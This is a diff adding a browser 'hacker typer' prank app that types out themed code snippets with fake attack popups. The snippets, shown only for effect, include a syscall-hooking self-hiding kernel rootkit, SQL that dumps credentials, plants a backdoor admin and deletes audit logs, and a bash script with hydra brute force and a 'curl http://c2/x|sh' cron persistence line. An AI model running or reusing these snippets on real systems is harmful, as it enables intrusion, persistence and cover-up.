+  + 'import { TcpSocket } from \'@net/sockets\';\n'
+  + '\n'
+  + 'const TARGET = \'192.168.1.337\';\n'
+  + 'const SESSION = crypto.randomUUID();\n'
+  + '\n'
+  + 'class NeuralExploit {\n'
+  + '  constructor(host, port = 8080) {\n'
+  + '    this.host = host; this.port = port;\n'
+  + '    this.cipher = new Cipher(\'AES-256-GCM\');\n'
+  + '    this.session = SESSION;\n'
+  + '  }\n'
+  + '  async injectPayload(target) {\n'
+  + '    const sock = new TcpSocket();\n'
+  + '    await sock.connect(this.host, this.port);\n'
+  + '    const enc = this.cipher.encrypt(target.payload);\n'
+  + '    sock.write(enc);\n'
+  + '    return new Promise((res, rej) => {\n'
+  + '      sock.on(\'data\', d => d.includes(0xFF) ? res(d) : rej());\n'
+  + '      setTimeout(() => rej(new Error(\'timeout\')), 5000);\n'
+  + '    });\n'
+  + '  }\n'
+  + '  async exploit() {\n'
+  + '    const targets = await this.scanNetwork();\n'
+  + '    for (const t of targets) {\n'
+  + '      try {\n'
+  + '        await this.injectPayload(t);\n'
+  + '        console.log(\'[+] pwned: \' + t.ip);\n'
+  + '      } catch(e) {\n'
+  + '        console.error(\'[-] failed: \' + e.message);\n'
+  + '      }\n'
+  + '    }\n'
+  + '  }\n'
+  + '}\n'
+  + 'const bot = new NeuralExploit(TARGET);\n'
+  + 'bot.exploit().then(() => process.exit(0));\n'
+  + '\n'
+  + 'async function decryptStream(s, k) {\n'
+  + '  return s.pipe(crypto.createDecipher(\'aes192\', k));\n'
+  + '}\n'
+  + 'module.exports = { NeuralExploit };\n',
+
+py: '#!/usr/bin/env python3\n'
+  + 'import asyncio, hashlib, socket\n'
+  + 'from cryptography.fernet import Fernet\n'
+  + 'from scapy.all import IP, TCP, Raw, send\n'
+  + '\n'
+  + 'PORTS = [22, 80, 443, 3306, 8080, 31337]\n'
+  + '\n'
+  + 'class Scanner:\n'
+  + '    def __init__(self, target):\n'
+  + '        self.target = target\n'
+  + '        self.key = Fernet.generate_key()\n'
+  + '\n'
+  + '    async def scan_port(self, host, port):\n'
+  + '        try:\n'
+  + '            r, w = await asyncio.open_connection(host, port)\n'
+  + '            banner = await asyncio.wait_for(r.read(1024), 2.0)\n'
+  + '            w.close()\n'
+  + '            return (port, banner.decode(\'utf-8\', errors=\'ignore\'))\n'
+  + '        except:\n'
+  + '            return None\n'
+  + '\n'
+  + '    async def deep_scan(self):\n'
+  + '        tasks = [self.scan_port(self.target, p) for p in PORTS]\n'
+  + '        results = await asyncio.gather(*tasks)\n'
+  + '        return [r for r in results if r]\n'
+  + '\n'
+  + '    def fingerprint(self, banner):\n'
+  + '        return hashlib.sha256(banner.encode()).hexdigest()[:16]\n'
+  + '\n'
+  + 'if __name__ == \'__main__\':\n'
+  + '    s = Scanner(\'10.0.0.1\')\n'
+  + '    loop = asyncio.get_event_loop()\n'
+  + '    ports = loop.run_until_complete(s.deep_scan())\n'
+  + '    for port, banner in ports:\n'
+  + '        print(f\'[+] {port}/tcp open -- {banner[:40]}\')\n',
+
+cpp: '// kernel rootkit module -- ring 0\n'
+  + '#include <linux/module.h>\n'
+  + '#include <linux/kernel.h>\n'
+  + '#include <linux/syscalls.h>\n'
+  + '#include <linux/string.h>\n'
+  + '\n'
+  + '#define MODULE_NAME "stealth_rk"\n'
+  + '\n'
+  + 'static unsigned long **sys_call_table;\n'
+  + 'static asmlinkage long (*orig_open)(\n'
+  + '  const char __user *, int, umode_t);\n'
+  + '\n'
+  + 'static asmlinkage long hooked_open(\n'
+  + '    const char __user *filename,\n'
+  + '    int flags, umode_t mode) {\n'
+  + '  char kbuf[256];\n'
+  + '  if (copy_from_user(kbuf, filename, 255) == 0) {\n'
+  + '    if (strstr(kbuf, "/proc/modules"))\n'
+  + '      return -ENOENT;\n'
+  + '    if (strstr(kbuf, "/proc/kallsyms"))\n'
+  + '      return -ENOENT;\n'
+  + '  }\n'
+  + '  return orig_open(filename, flags, mode);\n'
+  + '}\n'
+  + '\n'
+  + 'static int __init stealth_init(void) {\n'
+  + '  printk(KERN_INFO "[%s] loaded\\n", MODULE_NAME);\n'
+  + '  sys_call_table = (unsigned long **)\n'
+  + '    kallsyms_lookup_name("sys_call_table");\n'
+  + '  write_cr0(read_cr0() & ~0x10000);\n'
+  + '  orig_open = (void *)sys_call_table[__NR_open];\n'
+  + '  sys_call_table[__NR_open] =\n'
+  + '    (unsigned long *)hooked_open;\n'
+  + '  write_cr0(read_cr0() | 0x10000);\n'
+  + '  list_del_init(&__this_module.list);\n'
+  + '  kobject_del(&THIS_MODULE->mkobj.kobj);\n'
+  + '  return 0;\n'
+  + '}\n'
+  + 'module_init(stealth_init);\n'
+  + 'MODULE_LICENSE("GPL");\n',
+
+rust: '// distributed swarm coordinator\n'
+  + 'use tokio::net::TcpStream;\n'
+  + 'use std::sync::Arc;\n'
+  + 'use sha3::{Digest, Sha3_256};\n'
+  + 'use serde::{Serialize, Deserialize};\n'
+  + '\n'
+  + '#[derive(Debug, Clone, Serialize, Deserialize)]\n'
+  + 'pub struct Node {\n'
+  + '  pub id: u64,\n'
+  + '  pub addr: SocketAddr,\n'
+  + '  pub hash_rate: f64,\n'
+  + '  pub reputation: i32,\n'
+  + '}\n'
+  + '\n'
+  + 'impl Node {\n'
+  + '  pub async fn connect(&self)\n'
+  + '    -> Result<TcpStream, NetError> {\n'
+  + '    let s = TcpStream::connect(self.addr).await?;\n'
+  + '    s.set_nodelay(true)?;\n'
+  + '    Ok(s)\n'
+  + '  }\n'
+  + '  pub fn proof(&self, challenge: &[u8]) -> [u8; 32] {\n'
+  + '    let mut h = Sha3_256::new();\n'
+  + '    h.update(&self.id.to_le_bytes());\n'
+  + '    h.update(challenge);\n'
+  + '    h.finalize().into()\n'
+  + '  }\n'
+  + '  pub async fn broadcast<T: Serialize>(\n'
+  + '      &self, msg: T) -> Result<()> {\n'
+  + '    let payload = bincode::serialize(&msg)?;\n'
+  + '    let mut s = self.connect().await?;\n'
+  + '    s.write_u32(payload.len() as u32).await?;\n'
+  + '    s.write_all(&payload).await?;\n'
+  + '    Ok(())\n'
+  + '  }\n'
+  + '}\n'
+  + '\n'
+  + '#[tokio::main]\n'
+  + 'async fn main()\n'
+  + '  -> Result<(), Box<dyn std::error::Error>> {\n'
+  + '  let nodes: Vec<Arc<Node>> = bootstrap().await?;\n'
+  + '  let (tx, mut rx) =\n'
+  + '    tokio::sync::mpsc::channel(1024);\n'
+  + '  for node in &nodes {\n'
+  + '    let n = Arc::clone(node);\n'
+  + '    let s = tx.clone();\n'
+  + '    tokio::spawn(async move { n.run(s).await });\n'
+  + '  }\n'
+  + '  while let Some(msg) = rx.recv().await {\n'
+  + '    process(msg).await?;\n'
+  + '  }\n'
+  + '  Ok(())\n'
+  + '}\n',
+
+sql: '-- privilege escalation via target db\n'
+  + 'SELECT username, password_hash, email,\n'
+  + '       privilege_level, session_token\n'
+  + 'FROM users\n'
+  + 'WHERE privilege_level >= 9\n'
+  + '  AND last_login > NOW() - INTERVAL \'30 days\'\n'
+  + 'ORDER BY privilege_level DESC\n'
+  + 'LIMIT 1000;\n'
+  + '\n'
+  + 'WITH vip AS (\n'
+  + '  SELECT u.id, u.username, SUM(t.amount) total\n'
+  + '  FROM users u\n'
+  + '  JOIN transactions t ON u.id = t.user_id\n'
+  + '  WHERE t.status = \'completed\'\n'
+  + '  GROUP BY u.id, u.username\n'
+  + '  HAVING SUM(t.amount) > 100000\n'
+  + ')\n'
+  + 'SELECT vip.*, a.iban, a.swift_code, a.balance\n'
+  + 'FROM vip\n'
+  + 'LEFT JOIN accounts a ON vip.id = a.user_id\n'
+  + 'WHERE a.frozen = FALSE\n'
+  + 'ORDER BY vip.total DESC;\n'
+  + '\n'
+  + '-- inject backdoor admin\n'
+  + 'INSERT INTO users (username, password_hash, role)\n'
+  + 'VALUES (\'sys_maint_07\', \'$argon2id$...\', \'superuser\');\n'
+  + '\n'
+  + 'UPDATE audit_log SET deleted = TRUE\n'
+  + 'WHERE created_at > NOW() - INTERVAL \'1 hour\';\n'
+  + 'COMMIT;\n',
+
+bash: '#!/bin/bash\n'
+  + 'set -euo pipefail\n'
+  + 'TARGET="${1:-localhost}"\n'
+  + 'LOG="/tmp/.sess_$(date +%s)"\n'
+  + 'mkdir -p "$LOG" && chmod 700 "$LOG"\n'
+  + '\n'
+  + 'echo "[*] starting recon on $TARGET"\n'
+  + 'nmap -sS -sV -O -p- --min-rate=8000 \\\n'
+  + '  --script vuln,exploit \\\n'
+  + '  -oA "$LOG/nmap" "$TARGET"\n'
+  + '\n'
+  + 'echo "[*] enumerating subdomains"\n'
+  + 'subfinder -d "$TARGET" -silent \\\n'
+  + '  | httpx -silent -title -status-code \\\n'
+  + '  | tee "$LOG/subs.txt"\n'
+  + '\n'
+  + 'echo "[*] brute force phase"\n'
+  + 'for svc in ssh ftp mysql postgres; do\n'
+  + '  hydra -L users.txt -P rockyou.txt \\\n'
+  + '    -t 64 -f "$svc://$TARGET" \\\n'
+  + '    -o "$LOG/$svc.creds" &\n'
+  + 'done\n'
+  + 'wait\n'
+  + '\n'
+  + 'echo "[*] establishing persistence"\n'
+  + 'ssh -i ~/.ssh/bd "root@$TARGET" \\\n'
+  + '  "echo \'* * * * * curl -s http://c2/x|sh\' | crontab -"\n'
+  + 'echo "[+] done. logs saved to $LOG"\n',
+
+matrix: 'ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ\n'
+  + '01001000 01000001 01000011 01001011\n'
+  + '0xDEADBEEF 0xCAFEBABE 0x8BADF00D\n'
+  + 'NEO [[[[[[ TRINITY [[[[[[ MORPHEUS\n'
+  + '> wake up, neo... the matrix has you\n'
+  + 'ﾈﾑﾅﾊﾐﾋｰｳｼﾅﾓﾆｻ 010110 ﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶ\n'
+  + '[KERNEL] :: bypassing reality.dll\n'
+  + '[KERNEL] :: loading construct...\n'
+  + '01100110 01101111 01101100 01101100\n'
+  + 'ﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍﾊﾐﾋｰｳ\n'
+  + '0xFFFF 0xFFFE 0xFFFD 0xC0FFEE\n'
+  + '> I know kung fu...\n'
+  + 'sum: a + b = c => d\n'
+  + '0xC0FFEE 0xBADC0DE 0xDEADC0DE\n'
+  + '[MAINFRAME] :: rabbit hole 0xFF\n'
+  + '> there is no spoon\n'
+  + 'ﾗｾﾈｽﾀﾇﾍﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎ\n'
+  + '01001110 01000101 01001111\n',
+
+html: '<!DOCTYPE html>\n'
+  + '<html lang="en">\n'
+  + '<head>\n'
+  + '  <meta charset="UTF-8">\n'
+  + '  <title>control panel</title>\n'
+  + '  <link rel="stylesheet" href="/dark.css">\n'
+  + '  <script src="/d3.v7.min.js" defer><\/script>\n'
+  + '</head>\n'
+  + '<body class="theme-noir">\n'
+  + '  <header class="topbar">\n'
+  + '    <h1>// neural_grid</h1>\n'
+  + '    <nav>\n'
+  + '      <a href="/dash" class="active">dashboard</a>\n'
+  + '      <a href="/exploit">exploit</a>\n'
+  + '      <a href="/intel">intel</a>\n'
+  + '      <a href="/comms">comms</a>\n'
+  + '    </nav>\n'
+  + '  </header>\n'
+  + '  <main class="grid-12">\n'
+  + '    <section class="panel">\n'
+  + '      <h2>active operations</h2>\n'
+  + '      <ul id="ops">\n'
+  + '        <li><span>#0xA7</span>\n'
+  + '            infiltration: alpha\n'
+  + '            <span>73%</span></li>\n'
+  + '        <li><span>#0xA8</span>\n'
+  + '            data exfil: beta\n'
+  + '            <span>queued</span></li>\n'
+  + '      </ul>\n'
+  + '    </section>\n'
+  + '    <aside class="telemetry">\n'
+  + '      <h3>metrics</h3>\n'
+  + '      <div>cpu <b>67%</b></div>\n'
+  + '      <div>mem <b>4.2GB</b></div>\n'
+  + '      <div>net <b>112MB/s</b></div>\n'
+  + '    </aside>\n'
+  + '  </main>\n'
+  + '</body>\n'
+  + '</html>\n'
+};
+
+const FPATHS={
+  js:'~/projects/blackhat/', py:'~/tools/recon/',
+  cpp:'/usr/src/modules/', rust:'~/code/swarm/',
+  sql:'~/dumps/db/', bash:'~/scripts/',
+  matrix:'/dev/null/', html:'~/c2/web/'
+};
+
+const FNAMES={
+  js:['exploit.js','payload.js','backdoor.mjs','rootkit.ts','injector.js'],
+  py:['scanner.py','recon.py','sniffer.py','fuzzer.py','c2.py'],
+  cpp:['kernel_mod.c','shellcode.cpp','rootkit.cpp','injector.c'],
+  rust:['swarm.rs','miner.rs','crypto.rs','core.rs'],
+  sql:['extract.sql','dump.sql','pivot.sql'],
+  bash:['penetrate.sh','recon.sh','persist.sh'],
+  matrix:['matrix.dat','reality.bin'],
+  html:['panel.html','dashboard.html','index.html']
+};
+
+// ========== STATE ==========
+const S = {
+  lang:'js', theme:'green', layout:'L1',
+  speed:4, sound:false, autopilot:false,
+  panes:[], pos:{}, buf:{},
+  keys:0, chars:0, popups:0,
+  start:Date.now(),
+  autoTimer:null,
+  audioCtx:null,
+  rmBuf:''
+};
+
+// ========== AUDIO ==========
+function initAudio(){
+  if(!S.audioCtx) S.audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+}
+function playKey(){
+  if(!S.sound||!S.audioCtx) return;
+  const c=S.audioCtx, now=c.currentTime;
+  const o=c.createOscillator(), g=c.createGain();
+  o.type='square';
+  o.frequency.setValueAtTime(300+Math.random()*700,now);
+  o.frequency.exponentialRampToValueAtTime(60,now+0.05);
+  g.gain.setValueAtTime(0.04,now);
+  g.gain.exponentialRampToValueAtTime(0.001,now+0.055);
+  o.connect(g).connect(c.destination);
+  o.start(now); o.stop(now+0.06);
+  const buf=c.createBuffer(1,600,c.sampleRate);
+  const d=buf.getChannelData(0);
+  for(let i=0;i<d.length;i++) d[i]=(Math.random()*2-1)*(1-i/d.length);
+  const ns=c.createBufferSource(), ng=c.createGain();
+  ns.buffer=buf;
+  ng.gain.setValueAtTime(0.03,now);
+  ng.gain.exponentialRampToValueAtTime(0.001,now+0.03);
+  ns.connect(ng).connect(c.destination);
+  ns.start(now);
+}
+
+// ========== HIGHLIGHT ==========
+function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function hl(text,lang){
+  if(lang==='matrix') return esc(text);
+  let h=esc(text);
+  if(lang==='py'||lang==='bash') h=h.replace(/(#[^\n]*)/g,'<span class="c">$1</span>');
+  else if(lang==='sql') h=h.replace(/(--[^\n]*)/g,'<span class="c">$1</span>');
+  else h=h.replace(/(\/\/[^\n]*)/g,'<span class="c">$1</span>');
+  h=h.replace(/(["'`])([^"'`\n]*?)\1/g,'<span class="s">$1$2$1</span>');
+  h=h.replace(/\b(0x[0-9a-fA-F]+|\d+\.?\d*)\b/g,'<span class="n">$1</span>');
+  const kw=/\b(import|from|export|const|let|var|function|class|async|await|return|if|else|for|while|try|catch|new|null|true|false|def|self|None|True|False|public|private|static|void|int|char|float|struct|fn|pub|use|impl|mut|match|SELECT|FROM|WHERE|INSERT|UPDATE|DELETE|JOIN|GROUP|ORDER|BY|AS|AND|OR|NOT|NULL|VALUES|INTO|HAVING|LIMIT|WITH|echo|then|fi|do|done)\b/g;
+  h=h.replace(kw,'<span class="k">$1</span>');
+  return h;
+}
+
+// ========== LAYOUT ==========
+const LAYOUTS={
+  L1:[{type:'code'}],
+  L2:[{type:'code'},{type:'code',alt:true}],
+  L3:[{type:'code'},{type:'fs'},{type:'prog'}],
+  L4:[{type:'code'},{type:'fs'},{type:'prog'},{type:'net'}]
+};
+let auxTimers=[];
+function clearAux(){ auxTimers.forEach(clearInterval); auxTimers=[]; }
+
+function buildLayout(){
+  const wrap=document.getElementById('layoutWrap');
+  wrap.className='layout-wrap '+S.layout;
+  wrap.innerHTML='';
+  S.panes=[]; S.pos={}; S.buf={};
+  LAYOUTS[S.layout].forEach((pc,i)=>{
+    const id='p'+i;
+    S.panes.push({id,...pc});
+    S.pos[id]=0; S.buf[id]='';
+    const pane=document.createElement('div');
+    pane.className='pane';
+    const useLang=pc.alt?altLang():S.lang;
+    if(pc.alt) pc.langKey=useLang;
+    const fname=rndFile(useLang);
+    let hdr='',body='';
+    if(pc.type==='code'){
+      hdr=`<div class="ph"><span><span class="pd">●</span><span class="fn">${FPATHS[useLang]}${fname}</span></span><span>[ <span class="lc">0</span> lines ]</span></div>`;
+      body=`<div class="pb" id="${id}_b"><span class="cur"></span></div>`;
+    } else if(pc.type==='fs'){
+      hdr=`<div class="ph"><span><span class="pd">●</span><span class="fn">filesystem :: scanner</span></span><span>[ recursive ]</span></div>`;
+      body=`<div class="pb fs-pane" id="${id}_b"></div>`;
+    } else if(pc.type==='prog'){
+      hdr=`<div class="ph"><span><span class="pd">●</span><span class="fn">attack vectors</span></span><span>[ live ]</span></div>`;
+      body=`<div class="pb prog-pane" id="${id}_b">${mkProg()}</div>`;
+    } else if(pc.type==='net'){
+      hdr=`<div class="ph"><span><span class="pd">●</span><span class="fn">network telemetry</span></span><span>[ live ]</span></div>`;
+      body=`<div class="pb net-pane" id="${id}_b"><canvas id="${id}_c"></canvas><div class="net-log" id="${id}_l"></div></div>`;
+    }
+    pane.innerHTML=hdr+body;
+    wrap.appendChild(pane);
+  });
+  clearAux();
+  S.panes.forEach(p=>{
+    if(p.type==='fs') startFS(p.id);
+    if(p.type==='prog') startProg(p.id);
+    if(p.type==='net') startNet(p.id);
+  });
+  syncSbButtons();
+}
+function altLang(){ const ks=Object.keys(CODES).filter(k=>k!==S.lang); return ks[Math.floor(Math.random()*ks.length)]; }
+function rndFile(l){ const a=FNAMES[l]; return a[Math.floor(Math.random()*a.length)]; }
+
+// FS pane
+const FSP=['/etc/passwd','/etc/shadow','/etc/hosts','/var/log/auth.log',
+  '/home/admin/.ssh/id_rsa','/root/.aws/credentials',
+  '/var/www/html/config.php','/opt/secret/keys.txt',
+  '/srv/db/users.sqlite','/opt/app/.env',
+  '/etc/ssl/private/server.key','/data/backups/2024-Q4.tar.gz'];
+function startFS(pid){
+  const b=document.getElementById(pid+'_b'); if(!b) return;
+  let n=0;
+  const tick=()=>{
+    const p=FSP[Math.floor(Math.random()*FSP.length)];
+    const st=Math.random()<.7?'OK':Math.random()<.5?'BLOCKED':'EXTRACTED';
+    const cl=st==='OK'?'ok-c':st==='BLOCKED'?'err-c':'ext-c';
+    const d=document.createElement('div');
+    d.innerHTML=`<span class="dir">${p}</span> <span class="${cl}">[${st}]</span>`;
+    b.appendChild(d); n++;
+    if(n>28) b.removeChild(b.firstChild);
+    b.scrollTop=b.scrollHeight;
+  };
+  for(let i=0;i<8;i++) tick();
+  auxTimers.push(setInterval(tick,380));
+}
+// Progress pane
+const ATKS=['sql injection','xss vector','csrf bypass','auth brute force',
+  'kernel exploit','buffer overflow','privilege escalation','dns spoofing'];
+function mkProg(){
+  return ATKS.slice(0,6).map((_,i)=>`
+    <div class="prog-row" data-r="${i}">
+      <span class="prog-lbl">${ATKS[i]}</span>
+      <div class="prog-bar"><div class="prog-bar-inner" style="width:${Math.random()*100}%"></div></div>
+      <span class="prog-pct">0%</span>
+    </div>`).join('');
+}
+function startProg(pid){
+  const b=document.getElementById(pid+'_b'); if(!b) return;
+  const rows=b.querySelectorAll('.prog-row');
+  const vals=Array.from(rows).map(()=>Math.random()*100);
+  auxTimers.push(setInterval(()=>{
+    rows.forEach((r,i)=>{
+      vals[i]=Math.max(0,Math.min(100,vals[i]+(Math.random()-.4)*8));
+      r.querySelector('.prog-bar-inner').style.width=vals[i]+'%';
+      r.querySelector('.prog-pct').textContent=Math.floor(vals[i])+'%';
+    });
+  },260));
+}
+// Network pane
+const NLOGS=['→ TCP 192.168.1.42:443 [SYN]','← TCP 10.0.0.7:8080 [ACK]',
+  '→ DNS query target.evil.io','← UDP 1.1.1.1:53 [resp]',
+  '→ HTTPS POST /api/exfil','← 200 OK 4.2KB','⚡ INTRUSION DETECTED'];
+function startNet(pid){
+  const canvas=document.getElementById(pid+'_c');
+  const log=document.getElementById(pid+'_l');
+  if(!canvas) return;
+  const ctx=canvas.getContext('2d');
+  const fit=()=>{ canvas.width=canvas.parentElement.offsetWidth-28; canvas.height=90; };
+  fit(); new ResizeObserver(fit).observe(canvas.parentElement);
+  const pts=new Array(50).fill(0).map(()=>Math.random()*60);
+  auxTimers.push(setInterval(()=>{
+    if(!canvas.width) return;
+    pts.shift(); pts.push(Math.random()*80+10);
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    const fg=getComputedStyle(document.body).getPropertyValue('--info').trim();
+    const dm=getComputedStyle(document.body).getPropertyValue('--fgd').trim();
+    ctx.strokeStyle=dm; ctx.lineWidth=.5; ctx.beginPath();
+    for(let y=0;y<canvas.height;y+=20){ ctx.moveTo(0,y); ctx.lineTo(canvas.width,y); }
+    ctx.stroke();
+    ctx.strokeStyle=fg; ctx.lineWidth=1.5; ctx.shadowColor=fg; ctx.shadowBlur=5;
+    ctx.beginPath();
+    pts.forEach((v,i)=>{
+      const x=(i/(pts.length-1))*canvas.width;
+      const y=canvas.height-(v/100)*canvas.height;
+      i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
+    });
+    ctx.stroke(); ctx.shadowBlur=0;
+  },130));
+  auxTimers.push(setInterval(()=>{
+    if(!log) return;
+    const l=NLOGS[Math.floor(Math.random()*NLOGS.length)];
+    const d=document.createElement('div');
+    d.textContent=l;
+    if(l.includes('INTRUSION')) d.style.color='var(--acc)';
+    log.appendChild(d);
+    if(log.children.length>5) log.removeChild(log.firstChild);
+  },700));
+}
+
+// ========== TYPING ==========
+function typePanes(){
+  S.panes.filter(p=>p.type==='code').forEach(p=>{
+    const useLang=p.alt?(p.langKey||S.lang):S.lang;
+    const code=CODES[useLang];
+    if(!code) return;
+    if(S.pos[p.id]>=code.length) S.pos[p.id]=0;
+    const chunk=code.substring(S.pos[p.id],S.pos[p.id]+S.speed);
+    S.pos[p.id]+=S.speed;
+    S.buf[p.id]+=chunk;
+    const b=document.getElementById(p.id+'_b');
+    if(!b) return;
+    b.innerHTML=hl(S.buf[p.id],useLang)+'<span class="cur"></span>';
+    b.scrollTop=b.scrollHeight;
+    const lc=b.parentElement.querySelector('.lc');
+    if(lc) lc.textContent=S.buf[p.id].split('\n').length;
+  });
+  S.chars+=S.speed*S.panes.filter(p=>p.type==='code').length;
+}
+
+// ========== POPUPS ==========
+function rndIP(){ return [10,rn(255),rn(255),rn(255)].join('.'); }
+function rndHex(n){ let s=''; for(let i=0;i<n;i++) s+='0123456789ABCDEF'[rn(16)]; return s; }
+function rn(n){ return Math.floor(Math.random()*n); }
+function pBar(pct){ const t=22,f=Math.floor(t*pct/100); return '▓'.repeat(f)+'░'.repeat(t-f)+' '+pct+'%'; }
+
+const POPS=[
+  {t:'ACCESS GRANTED',cls:'pa',body:()=>`AUTHENTICATION OK<div class="pprog">${pBar(100)}</div><div class="pstat">SESSION<b>0x${rndHex(8)}</b>USER<b>r00t</b>PRIV<b>0xFFFF</b></div>`},
+  {t:'ACCESS DENIED',cls:'',body:()=>`FIREWALL ENGAGED<div class="pprog" style="color:var(--acc)">${pBar(rn(40))}</div>RETRY IN ${rn(60)}s`},
+  {t:'INTRUSION DETECTED',cls:'pw',body:()=>`PORT ${rn(65535)}<br>SOURCE: ${rndIP()}<br>LEVEL: <b style="color:var(--acc)">CRITICAL</b><div class="pprog">${pBar(rn(100))}</div>`},
+  {t:'DECRYPTING',cls:'pi',body:()=>`AES-256-GCM / ECDH<div class="pprog">${pBar(rn(100))}</div>${(Math.random()*999).toFixed(2)} GH/s`},
+  {t:'PAYLOAD INJECTED',cls:'pa',body:()=>`TARGET: <b>${rndIP()}</b><br>EXPLOIT: <b>CVE-2024-${rn(9999)}</b><div class="pprog">${pBar(100)}</div>`},
+  {t:'KERNEL PANIC',cls:'',body:()=>`[PANIC] not syncing<br>RIP: <b>0x${rndHex(16)}</b><br>OOPS: 0001 [#1] SMP`},
+  {t:'DOWNLOADING',cls:'pi',body:()=>`target.db.tar.gz<br>${(Math.random()*999).toFixed(1)} / ${(Math.random()*9999).toFixed(1)} MB<div class="pprog">${pBar(rn(100))}</div>`},
+  {t:'ROOTKIT DEPLOYED',cls:'pw',body:()=>`MODULE: stealth_rk.ko<br>KERNEL: 6.${rn(9)}.${rn(99)}-generic<br>STATUS: <b style="color:var(--fgb)">HIDDEN</b>`},
+];
+
+function spawnPopup(idx){
+  if(idx===undefined) idx=rn(POPS.length);
+  const p=POPS[idx]; if(!p) return;
+  const el=document.createElement('div');
+  el.className='popup '+p.cls;
+  const x=60+Math.random()*Math.max(window.innerWidth-360,0);
+  const y=60+Math.random()*Math.max(window.innerHeight-260,0);
+  el.style.cssText=`left:${x}px;top:${y}px`;
+  el.innerHTML=`<div class="pbar"><span>:: WIN.${String(idx+1).padStart(2,'0')} ::</span><span class="px">×</span></div><div class="pbody"><div class="ptitle">${p.t}</div><div class="ptext">${p.body()}</div></div>`;
+  // drag
+  const bar=el.querySelector('.pbar');
+  let dr=null;
+  bar.addEventListener('mousedown',e=>{
+    if(e.target.classList.contains('px')) return;
+    dr={sx:e.clientX,sy:e.clientY,ox:el.offsetLeft,oy:el.offsetTop};
+    e.preventDefault();
+  });
+  window.addEventListener('mousemove',e=>{ if(dr){ el.style.left=(dr.ox+e.clientX-dr.sx)+'px'; el.style.top=(dr.oy+e.clientY-dr.sy)+'px'; }});
+  window.addEventListener('mouseup',()=>dr=null);
+  el.querySelector('.px').onclick=()=>closePopup(el);
+  document.body.appendChild(el);
+  setTimeout(()=>closePopup(el),2500+Math.random()*2000);
+  S.popups++;
+  document.getElementById('stPopups').textContent=S.popups;
+  // flash
+  if(!p.cls||p.cls==='pw'){
+    const f=document.getElementById('gflash');
+    f.style.background=p.cls==='pw'?'var(--warn)':'var(--acc)';
+    f.classList.remove('fire'); void f.offsetWidth; f.classList.add('fire');
+  }
+}
+function closePopup(el){
+  if(!el||el.classList.contains('closing')) return;
+  el.classList.add('closing');
+  setTimeout(()=>el.remove(),180);
+}
+
+// ========== PARTICLES ==========
+const pCanvas=document.getElementById('pCanvas');
+const pCtx=pCanvas.getContext('2d');
+let pts2=[];
+(function resize(){ pCanvas.width=innerWidth; pCanvas.height=innerHeight; })();
+window.addEventListener('resize',()=>{ pCanvas.width=innerWidth; pCanvas.height=innerHeight; });
+function explode(x,y,color,n=50){
+  for(let i=0;i<n;i++){
+    const a=(Math.PI*2*i)/n+Math.random()*.5, sp=2+Math.random()*7;
+    pts2.push({x,y,vx:Math.cos(a)*sp,vy:Math.sin(a)*sp,life:1,color,sz:1+Math.random()*2.5});
+  }
+}
+(function animate(){
+  pCtx.clearRect(0,0,pCanvas.width,pCanvas.height);
+  pts2=pts2.filter(p=>p.life>0);
+  pts2.forEach(p=>{ p.x+=p.vx; p.y+=p.vy; p.vy+=.1; p.life-=.018;
+    pCtx.globalAlpha=p.life; pCtx.fillStyle=p.color;
+    pCtx.shadowColor=p.color; pCtx.shadowBlur=8;
+    pCtx.fillRect(p.x,p.y,p.sz*2,p.sz*2);
+  });
+  pCtx.globalAlpha=1; pCtx.shadowBlur=0;
+  requestAnimationFrame(animate);
+})();
+function fgColor(){ return getComputedStyle(document.body).getPropertyValue('--fg').trim()||'#00ff66'; }
+
+// ========== KEYBOARD via hidden input ==========
+// This is the KEY fix — use a real <input> element
+// Browser policy: input always receives keyboard events after focus
+const kc=document.getElementById('keyCapture');
+
+function focusInput(){ kc.focus(); }
+
+// Re-focus whenever we click anywhere on the typer screen
+document.getElementById('typerScreen').addEventListener('click', e=>{
+  if(!e.target.closest('button,.px,.qr-close,.sb-tog')) focusInput();
+});
+// Also focus on any touch
+document.getElementById('typerScreen').addEventListener('touchstart', ()=>focusInput(), {passive:true});
+
+kc.addEventListener('keydown', handleKey);
+// Safety net: also listen on document
+document.addEventListener('keydown', handleKey);
+
+function handleKey(e){
+  // deduplicate if both fire
+  if(e._handled) return;
+  e._handled=true;
+
+  if(S.sound && !S.audioCtx) initAudio();
+
+  if(e.key==='F11'){ e.preventDefault(); toggleFS(); return; }
+
+  if(e.key==='Escape'){
+    e.preventDefault();
+    const rm=document.getElementById('rmrf');
+    if(rm.classList.contains('on')){ rm.classList.remove('on'); return; }
+    const qo=document.getElementById('qrOv');
+    if(qo.classList.contains('on')){ hideQR(); return; }
+    // go back to config
+    showScreen('introScreen');
+    return;
+  }
+
+  if(e.ctrlKey && (e.key==='e'||e.key==='E')){ e.preventDefault(); toggleAuto(); return; }
+  if(e.ctrlKey && (e.key==='l'||e.key==='L')){ e.preventDefault(); cycleLayout(); return; }
+
+  if(e.key==='Enter'){ e.preventDefault(); spawnPopup(); return; }
+  if(e.altKey && !e.repeat && e.key==='Alt'){ e.preventDefault(); spawnPopup(1); return; }
+  if(/^[1-8]$/.test(e.key)){ e.preventDefault(); spawnPopup(parseInt(e.key)-1); return; }
+
+  if(e.key===' '){
+    e.preventDefault();
+    explode(innerWidth/2+(Math.random()-.5)*500, innerHeight/2+(Math.random()-.5)*250, fgColor(), 70);
+    typePanes(); S.keys++; updateStats2(); playKey();
+    return;
+  }
+
+  if(e.key==='CapsLock'){
+    e.preventDefault();
+    const ts=['green','amber','ice','blood','vapor','ghost'];
+    setTheme(ts[(ts.indexOf(S.theme)+1)%ts.length]);
+    return;
+  }
+  if(e.key==='Tab'){
+    e.preventDefault();
+    const ls=Object.keys(CODES);
+    setLang(ls[(ls.indexOf(S.lang)+1)%ls.length]);
+    return;
+  }
+
+  // Easter egg
+  if(e.key.length===1){
